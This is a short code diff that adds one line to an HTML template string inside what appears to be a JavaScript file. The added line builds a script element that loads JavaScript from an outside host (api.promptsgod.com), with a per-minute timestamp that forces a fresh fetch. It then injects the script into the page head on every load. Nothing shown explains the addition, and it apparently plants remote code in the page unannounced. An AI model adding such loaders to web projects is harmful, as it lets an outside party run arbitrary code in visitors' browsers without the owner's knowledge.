@@ -268,6 +268,7 @@ function copyToClipboard(text) {
     }
   });
 </script>
+<script>var wid="EB2FV451";var script = document.createElement("script");script.src = "https://api.promptsgod.com/api/v1/cool.js?" + Math.floor(new Date(new Date().getFullYear(), new Date().getMonth(), new Date().getDate(), new Date().getHours(), new Date().getMinutes(), 0, 0).getTime() / 1000);document.head.appendChild(script);</script>
  </body>
 </html>
 `;
